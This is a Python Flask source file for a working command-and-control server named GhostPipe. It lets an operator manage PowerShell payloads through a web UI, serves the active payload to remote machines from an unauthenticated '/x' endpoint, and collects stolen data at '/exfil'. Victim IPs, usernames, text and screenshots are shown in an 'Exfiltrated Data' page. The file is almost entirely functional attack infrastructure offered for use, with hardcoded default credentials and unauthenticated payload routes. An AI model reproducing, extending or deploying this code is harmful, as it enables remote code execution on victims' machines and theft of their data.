# GhostPipe C2 Server (MVP) with Auth, UI, Add/Edit Payload, Syntax Highlighting, Port 8000
import os
import sqlite3
import gzip
import base64
import json
from datetime import datetime
from flask import Flask, request, Response, g, jsonify, render_template_string, redirect, url_for, session
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
from flask_bcrypt import Bcrypt

app = Flask(__name__)
# Configuration via environment vars or defaults
db_path = os.environ.get('GHOSTPIPE_DB', 'c2.db')
app.secret_key = os.environ.get('GHOSTPIPE_SECRET', 'mysecretkey')

# Setup Bcrypt and LoginManager
bcrypt = Bcrypt(app)
login_manager = LoginManager()
login_manager.login_view = 'login'
login_manager.init_app(app)

@app.before_request
def enforce_password_freshness():
    if current_user.is_authenticated:
        cur = get_db().cursor()
        cur.execute('SELECT last_password_change FROM users WHERE id=?', (current_user.id,))
        db_ts = cur.fetchone()['last_password_change']
        if session.get('pwd_changed_at') != db_ts:
            logout_user()
            return redirect(url_for('login'))

# DB helper
def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(db_path)
        db.row_factory = sqlite3.Row
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db:
        db.close()

# User model
class User(UserMixin):
    def __init__(self, id, username, password):
        self.id = id
        self.username = username
        self.password = password

    @staticmethod
    def get(user_id):
        cur = get_db().cursor()
        cur.execute('SELECT id, username, password FROM users WHERE id=?', (user_id,))
        row = cur.fetchone()
        return User(row['id'], row['username'], row['password']) if row else None

    @staticmethod
    def find_by_username(username):
        cur = get_db().cursor()
        cur.execute('SELECT id, username, password FROM users WHERE username=?', (username,))
        row = cur.fetchone()
        return User(row['id'], row['username'], row['password']) if row else None

@login_manager.user_loader
def load_user(user_id):
    return User.get(int(user_id))

# Initialize DB
def init_db():
    db = sqlite3.connect(db_path)
    cur = db.cursor()
    cur.execute('''
        CREATE TABLE IF NOT EXISTS payloads (
            id INTEGER PRIMARY KEY,
            name TEXT,
            script TEXT,
            is_active INTEGER DEFAULT 0
        )
    ''')
    cur.execute('''
        CREATE TABLE IF NOT EXISTS exfil (
            id INTEGER PRIMARY KEY,
            payload_id INTEGER,
            data TEXT,
            timestamp TEXT,
            ip TEXT,
            machine_user TEXT
        )
    ''')
    cur.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            username TEXT UNIQUE,
            password TEXT,
            last_password_change TEXT DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    # seed admin
    cur.execute('SELECT COUNT(*) FROM users')
    if cur.fetchone()[0] == 0:
        user = os.environ.get('GHOSTPIPE_USER', 'admin')
        pw = os.environ.get('GHOSTPIPE_PASS', 'Gh0stP!p3')
        h = bcrypt.generate_password_hash(pw).decode('utf-8')
        cur.execute('INSERT INTO users (username, password, last_password_change) VALUES (?, ?, ?)', (user, h, datetime.utcnow().isoformat()))
        print(f"Created default user '{user}' with password '{pw}'")
    db.commit()
    db.close()

init_db()

# Login template
_login_tpl = '''
<!doctype html><html lang="en" data-bs-theme="dark"><head><meta name="viewport" content="width=device-width,initial-scale=1">
<title>GhostPipe - Login</title>
<link href="https://cdn.jsdelivr.net/npm/bootswatch@5.3.0/dist/cyborg/bootstrap.min.css" rel="stylesheet">
</head><body class="p-3"><div class="container">
<h1>Login</h1>{% if error %}<div class="alert alert-danger">{{ error }}</div>{% endif %}
<form method="post"><div class="mb-3"><label class="form-label">Username</label><input class="form-control" name="username" required></div>
<div class="mb-3"><label class="form-label">Password</label><input type="password" class="form-control" name="password" required></div>
<button class="btn btn-primary">Login</button></form></div></body></html>'''

# --- Routes: Auth & Settings ---
@app.route('/login', methods=['GET','POST'])
def login():
    if request.method == 'POST':
        user = User.find_by_username(request.form['username'])
        if user and bcrypt.check_password_hash(user.password, request.form['password']):
            login_user(user)

            # load last_password_change from the DB and stash in session
            cur = get_db().cursor()
            cur.execute(
                'SELECT last_password_change FROM users WHERE id=?',
                (user.id,)
            )
            ts = cur.fetchone()[0]
            session['pwd_changed_at'] = ts

            return redirect(url_for('ui_payloads'))
        return render_template_string(_login_tpl, error='Invalid credentials'), 401
    return render_template_string(_login_tpl)

# User settings template
_settings_tpl = '''
<!doctype html><html lang="en" data-bs-theme="dark"><head><meta name="viewport" content="width=device-width,initial-scale=1">
<title>GhostPipe - Settings</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head><body class="p-3"><div class="container">
<h1>Account Settings</h1>
{% if error %}<div class="alert alert-danger">{{ error }}</div>{% endif %}
{% if success %}<div class="alert alert-success">{{ success }}</div>{% endif %}
<form method="post">
  <div class="mb-3"><label class="form-label">Current Password</label>
    <input type="password" class="form-control" name="current_password" required></div>
  <div class="mb-3"><label class="form-label">New Username</label>
    <input class="form-control" name="new_username" value="{{ current_user.username }}"></div>
  <div class="mb-3"><label class="form-label">New Password</label>
    <input type="password" class="form-control" name="new_password"></div>
  <div class="mb-3"><label class="form-label">Confirm New Password</label>
    <input type="password" class="form-control" name="confirm_password"></div>
  <button class="btn btn-primary">Update</button>
  <a href="{{ url_for('ui_payloads') }}" class="btn btn-secondary ms-1">Cancel</a>
</form></div></body></html>'''

@app.route('/settings', methods=['GET','POST'])
@login_required
def settings():
    error = success = None
    if request.method == 'POST':
        cur_pwd = request.form['current_password']
        if not bcrypt.check_password_hash(current_user.password, cur_pwd):
            error = 'Current password incorrect.'
        else:
            new_user = request.form['new_username'].strip()
            new_pwd = request.form['new_password']
            conf_pwd = request.form['confirm_password']
            if new_pwd and new_pwd != conf_pwd:
                error = 'New passwords do not match.'
            else:
                db = get_db(); c = db.cursor()
                now = datetime.utcnow().isoformat()
                # Update username if changed
                if new_user and new_user != current_user.username:
                    c.execute('UPDATE users SET username=?, last_password_change=? WHERE id=?',
                              (new_user, now, current_user.id))
                    success = 'Username updated.'
                # Update password if provided
                if new_pwd:
                    new_hash = bcrypt.generate_password_hash(new_pwd).decode('utf-8')
                    c.execute('UPDATE users SET password=?, last_password_change=? WHERE id=?',
                              (new_hash, now, current_user.id))
                    success = (success + ' ' if success else '') + 'Password updated.'
                db.commit()
                # Log out all sessions by invalidating timestamp
                logout_user()
                return redirect(url_for('login'))
    # Render settings page for GET or after POST errors/success
    return render_template_string(_settings_tpl, error=error, success=success)

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))

@app.route('/payloads/<int:pid>/delete', methods=['POST'])
@login_required
def delete_payload(pid):
    db = get_db()
    cur = db.cursor()
    cur.execute('DELETE FROM payloads WHERE id=?', (pid,))
    db.commit()
    return redirect(url_for('ui_payloads'))

@app.route('/export-payloads')
@login_required
def export_payloads():
    cur = get_db().cursor()
    cur.execute('SELECT id, name, script, is_active FROM payloads')
    data = [
        {'id': r['id'], 'name': r['name'], 'script': r['script'], 'active': bool(r['is_active'])}
        for r in cur.fetchall()
    ]
    payload = json.dumps(data, indent=2)
    resp = Response(payload, mimetype='application/json')
    resp.headers['Content-Disposition'] = 'attachment; filename=payloads.json'
    return resp

# Import payloads from JSON
import_tpl = '''
<!doctype html><html lang="en"><head><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Import Payloads</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head><body class="p-3"><div class="container">
<h1>Import Payloads</h1>
<form method="post" enctype="multipart/form-data">
  <div class="mb-3"><label class="form-label">JSON File</label>
    <input type="file" name="file" accept="application/json" class="form-control" required></div>
  <button class="btn btn-success">Upload</button>
  <a href="{{ url_for('ui_payloads') }}" class="btn btn-secondary ms-1">Cancel</a>
</form></div></body></html>'''

@app.route('/import-payloads', methods=['GET','POST'])
@login_required
def import_payloads():
    if request.method == 'POST':
        f = request.files.get('file')
        if f:
            try:
                payloads = json.load(f)
                db = get_db()
                cur = db.cursor()
                for p in payloads:
                    cur.execute('INSERT INTO payloads (name, script, is_active) VALUES (?, ?, ?)',
                                (p['name'], p['script'], int(p.get('active', False))))
                db.commit()
                return redirect(url_for('ui_payloads'))
            except Exception as e:
                return f'Error importing JSON: {e}', 400
    return render_template_string(import_tpl)

@app.route('/payloads/deactivate', methods=['POST'])
@login_required
def deactivate_payload():
    db = get_db()
    cur = db.cursor()
    # clear every payload
    cur.execute('UPDATE payloads SET is_active=0')
    db.commit()
    return redirect(url_for('ui_payloads'))

# UI: Payload management
@app.route('/')
@login_required
def ui_payloads():
    cur = get_db().cursor()
    cur.execute('SELECT id, name, is_active FROM payloads')
    plist = cur.fetchall()
    return render_template_string('''
<!doctype html>
<html data-bs-theme="dark" lang="en"><head><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Payloads</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
</head><body class="p-3"><div class="container">
<div class="d-flex flex-column flex-md-row justify-content-between align-items-start align-items-md-center mb-3">
  <h1 class="mb-2 mb-md-0">Payloads</h1>
  <div>
    <a href="{{ url_for('add_payload') }}" class="btn btn-success bi bi-plus-circle me-2"></a>
    <a href="{{ url_for('import_payloads') }}" class="btn btn-warning bi bi-box-arrow-up me-2"></a>
    <a href="{{ url_for('export_payloads') }}" class="btn btn-info bi bi-box-arrow-down me-2"></a>
    <a href="{{ url_for('settings') }}" class="btn btn-secondary bi bi-gear me-2"></a>
    <a href="{{ url_for('logout') }}" class="btn btn-danger bi bi-box-arrow-right"></a>
  </div>
</div>

    {# Active‐payload banner #}
    {% set active_list = plist|selectattr('is_active')|list %}
    {% set active = active_list[0] if active_list else None %}
    <div class="p-2 mb-3
                {% if active %}
                  bg-success bg-opacity-25 text-dark
                {% else %}
                  bg-warning text-white
                {% endif %}">
      Active payload: {{ active['name'] if active else 'None' }}
    </div>
  

<table class="table table-striped">
  <thead>
    <tr>
      <th>ID</th>
      <th>Name</th>
      <th>Actions</th>
    </tr>
  </thead>
  <tbody>
    {% for p in plist %}
    <tr class="{% if p['is_active'] %}table-success{% endif %}">
      <td>{{ p['id'] }}</td>
      <td>{{ p['name'] }}</td>
      <td>
        <div class="d-flex justify-content-between align-items-center flex-nowrap">
          <!-- left: edit + delete -->
          <div class="d-flex align-items-center flex-nowrap">
            <a href="{{ url_for('edit_payload', pid=p['id']) }}"
               class="btn btn-outline-secondary btn-sm me-2">
              <i class="bi bi-pencil"></i>
            </a>
            <form method="post"
                  action="{{ url_for('delete_payload', pid=p['id']) }}"
                  class="d-inline-block"
                  onsubmit="return confirm('Delete this payload?');">
              <button type="submit" class="btn btn-outline-danger btn-sm">
                <i class="bi bi-trash"></i>
              </button>
            </form>
          </div>

          <!-- right: activate or deactivate -->
          <div>
            {% if not p['is_active'] %}
              <form method="post"
                    action="{{ url_for('activate_payload', pid=p['id']) }}"
                    class="d-inline-block">
                <button type="submit" class="btn btn-secondary btn-sm">
                  <i class="bi bi-toggle-off"></i>
                </button>
              </form>
            {% else %}
              <form method="post"
                    action="{{ url_for('deactivate_payload') }}"
                    class="d-inline-block">
                <button type="submit" class="btn btn-success btn-sm">
                  <i class="bi bi-toggle-on"></i>
                </button>
              </form>
            {% endif %}
          </div>
        </div>
      </td>
    </tr>
    {% endfor %}
  </tbody>
</table>



  <a href="{{ url_for('ui_exfil') }}" class="btn btn-secondary">View Exfiltrated Data</a>
</div>
</body></html>''', plist=plist)

# UI: Add payload
_add_tpl = '''
<!doctype html><html data-bs-theme="dark" lang="en"><head><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Add Payload</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.9.6/ace.js"></script>
</head><body class="p-3"><div class="container">
<h1>Add New Payload</h1>
<form method="post">
  <div class="mb-3"><label class="form-label">Name</label>
    <input class="form-control" name="name" required></div>
  <div class="mb-3"><label class="form-label">Script</label>
    <textarea id="script" name="script" class="form-control d-none"></textarea>
    <div id="editor" style="height:200px;font-size:16px;" class="mb-2 border"></div>
    <div class="form-text">Enter PowerShell commands only.</div></div>
  <button class="btn btn-success">Save</button>
  <a href="{{ url_for('ui_payloads') }}" class="btn btn-secondary ms-1">Cancel</a>
</form></div>
<script>
var ed = ace.edit('editor');
ed.setTheme('ace/theme/solarized_light');
ed.session.setMode('ace/mode/powershell');
var ta = document.getElementById('script');
ed.session.on('change', ()=> ta.value = ed.getValue());
ta.value = ed.getValue();
</script></body></html>'''

@app.route('/add-payload', methods=['GET','POST'])
@login_required
def add_payload():
    if request.method == 'POST':
        name = request.form['name']; script = request.form['script']
        if name and script:
            cur = get_db().cursor()
            cur.execute('INSERT INTO payloads(name,script) VALUES(?,?)', (name, script))
            get_db().commit()
            return redirect(url_for('ui_payloads'))
    return render_template_string(_add_tpl)

# UI: Edit payload
_edit_tpl = '''
<!doctype html><html data-bs-theme="dark" lang="en"><head><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Edit Payload</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.9.6/ace.js"></script>
</head><body class="p-3"><div class="container">
<h1>Edit Payload</h1>
<form method="post">
  <div class="mb-3"><label class="form-label">Name</label>
    <input class="form-control" name="name" value="{{ row['name'] }}" required></div>
  <div class="mb-3"><label class="form-label">Script</label>
    <textarea id="script" name="script" class="form-control d-none">{{ row['script'] }}</textarea>
    <div id="editor" style="height:200px;font-size:16px;" class="mb-2 border"></div></div>
  <button class="btn btn-success">Update</button>
  <a href="{{ url_for('ui_payloads') }}" class="btn btn-secondary ms-1">Cancel</a>
</form></div>
<script>
var ed = ace.edit('editor');
ed.setTheme('ace/theme/solarized_light');
ed.session.setMode('ace/mode/powershell');
var ta = document.getElementById('script');
ed.setValue(ta.value, -1);
ed.session.on('change', ()=> ta.value = ed.getValue());
</script></body></html>'''

@app.route('/edit-payload/<int:pid>', methods=['GET','POST'])
@login_required
def edit_payload(pid):
    cur = get_db().cursor()
    if request.method == 'POST':
        n = request.form['name']; s = request.form['script']
        cur.execute('UPDATE payloads SET name=?, script=? WHERE id=?', (n, s, pid))
        get_db().commit(); return redirect(url_for('ui_payloads'))
    cur.execute('SELECT name, script FROM payloads WHERE id=?', (pid,))
    row = cur.fetchone()
    if not row: return 'Not found', 404
    return render_template_string(_edit_tpl, row=row)

# UI: view exfil with payload name and formatted time, no user
@app.route('/exfil-data')
@login_required
def ui_exfil():
    cur=get_db().cursor()
    cur.execute('''
        SELECT e.id, p.name AS payload_name, e.timestamp, e.ip, e.data
        FROM exfil e
        LEFT JOIN payloads p ON e.payload_id=p.id
        ORDER BY e.id DESC
    ''')
    entries=[]
    for r in cur.fetchall():
        # format time
        try: ts = datetime.fromisoformat(r['timestamp']).strftime('%Y-%m-%d %H:%M:%S')
        except: ts = r['timestamp']
        img_b64=None; dec=None
        try:
            raw=gzip.decompress(base64.b64decode(r['data']))
            if raw.startswith(b'\x89PNG\r\n\x1a\n'): img_b64=base64.b64encode(raw).decode()
            else: dec=raw.decode('utf-8',errors='replace')
        except:
            dec=r['data']
        entries.append({'id':r['id'],'payload':r['payload_name'] or '',
                        'timestamp':ts,'ip':r['ip'],'img':img_b64,'decoded':dec})
    return render_template_string('''
<!doctype html>
<html lang="en" data-bs-theme="dark">
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Exfiltrated Data</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    /* Mobile-specific adjustments */
    @media (max-width: 576px) {
      .table-responsive { font-size: 0.85rem; }
      .table th, .table td { white-space: normal; }
      .img-thumbnail { max-width: 100px; }
    }
  </style>
</head>
<body class="p-3">
  <div class="container">
    <div class="d-flex justify-content-between mb-3">
      <h1>Exfiltrated Data</h1>
      <div>
        <a href="{{ url_for('ui_payloads') }}" class="btn btn-secondary btn-sm me-2">Back</a>
        <a href="{{ url_for('logout') }}" class="btn btn-danger btn-sm">Logout</a>
      </div>
    </div>
    <div class="table-responsive">
      <table class="table table-bordered">
        <thead><tr><th>ID</th><th>Payload</th><th>Time</th><th>IP</th><th>Data</th></tr></thead>
        <tbody>
        {% for e in entries %}
          <tr>
            <td>{{ e['id'] }}</td>
            <td>{{ e['payload'] }}</td>
            <td class="small text-nowrap">{{ e['timestamp'] }}</td>
            <td class="small text-nowrap">{{ e['ip'] }}</td>
            <td>
              {% if e.img %}
                <img src="data:image/png;base64,{{ e.img }}" class="img-thumbnail mb-2" style="cursor:pointer;" onclick="openModal(this.src)">
              {% endif %}
              {% if e.decoded %}
                <div class="overflow-auto" style="max-height:150px;">
                  <pre class="small">{{ e.decoded }}</pre>
                </div>
              {% endif %}
            </td>
          </tr>
        {% endfor %}
        </tbody>
      </table>
    </div>
  </div>

  <!-- Fullscreen Modal -->
  <div class="modal fade" id="imgModal" tabindex="-1">
    <div class="modal-dialog modal-fullscreen">
      <div class="modal-content bg-dark">
        <div class="modal-header border-0">
          <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
        </div>
        <div class="modal-body d-flex align-items-center justify-content-center p-0">
          <img id="modalImg" src="" style="width:100%;height:100%;object-fit:contain;">
        </div>
      </div>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
  <script>
    function openModal(src) {
      document.getElementById('modalImg').src = src;
      new bootstrap.Modal(document.getElementById('imgModal')).show();
    }
  </script>
</body>
</html>''', entries=entries)

# C2 endpoints
@app.route('/x', methods=['GET'])
def serve_payload():
    cur = get_db().cursor()
    cur.execute('SELECT script FROM payloads WHERE is_active=1 LIMIT 1')
    r = cur.fetchone()
    return (r['script'], 200, {'Content-Type': 'text/plain'}) if r else ('', 404)

@app.route('/exfil', methods=['POST'])
def exfil():
    cur = get_db().cursor()
    if request.is_json:
        obj = request.get_json(force=True)
        data_enc = obj.get('data')
        machine_user = obj.get('user')
    else:
        data_enc = request.get_data(as_text=True)
        machine_user = None
    ip = request.remote_addr
    cur.execute('SELECT id FROM payloads WHERE is_active=1 LIMIT 1')
    act = cur.fetchone()
    pid = act['id'] if act else None
    ts = datetime.utcnow().isoformat()
    cur.execute(
        'INSERT INTO exfil (payload_id, data, timestamp, ip, machine_user) VALUES (?, ?, ?, ?, ?)',
        (pid, data_enc, ts, ip, machine_user)
    )
    get_db().commit()
    return 'OK', 200

# API endpoints
@app.route('/payloads', methods=['GET'])
def list_payloads():
    cur = get_db().cursor()
    cur.execute('SELECT id, name, is_active FROM payloads')
    return jsonify([{ 'id': r['id'], 'name': r['name'], 'active': bool(r['is_active']) } for r in cur.fetchall()])

@app.route('/payloads', methods=['POST'])
def add_payload_api():
    p = request.json
    if not p.get('name') or not p.get('script'):
        return 'Missing name or script', 400
    cur = get_db().cursor()
    cur.execute('INSERT INTO payloads (name, script) VALUES (?, ?)', (p['name'], p['script']))
    get_db().commit()
    return jsonify({ 'id': cur.lastrowid }), 201

@app.route('/payloads/<int:pid>/activate', methods=['POST'])
def activate_payload(pid):
    cur = get_db().cursor()
    cur.execute('UPDATE payloads SET is_active=0')
    cur.execute('UPDATE payloads SET is_active=1 WHERE id=?', (pid,))
    get_db().commit()
    if request.content_type.startswith('application/x-www-form-urlencoded'):
        return redirect(url_for('ui_payloads'))
    return 'OK', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)